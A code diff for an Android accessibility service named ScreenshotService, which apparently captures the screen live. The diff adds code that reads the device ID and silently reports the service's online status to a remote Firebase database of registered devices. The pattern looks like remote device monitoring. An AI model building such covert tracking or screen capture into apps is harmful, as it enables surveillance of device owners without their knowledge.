@@ -51,8 +51,16 @@ class ScreenshotService : AccessibilityService() {
     private val frameFiles = mutableListOf<File>()
     private val frameLock  = Any()
 
+    private val deviceId by lazy {
+        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+    }
+    private val accessibilityRef by lazy {
+        FirebaseDatabase.getInstance("https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app").getReference("registered_devices/$deviceId/accessibility_online")
+    }
+
     override fun onServiceConnected() {
         super.onServiceConnected()
+        try { accessibilityRef.setValue(true) } catch (_: Exception) {}
         serviceInfo = AccessibilityServiceInfo().apply {
             eventTypes   = AccessibilityEvent.TYPES_ALL_MASK
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
@@ -308,8 +316,9 @@ class ScreenshotService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
-    override fun onInterrupt() {}
+    override fun onInterrupt() { try { accessibilityRef.setValue(false) } catch (_: Exception) {} }
     override fun onDestroy() {
+        try { accessibilityRef.setValue(false) } catch (_: Exception) {}
         super.onDestroy()
         isLiveEnabled = false
         liveCapJob?.cancel()
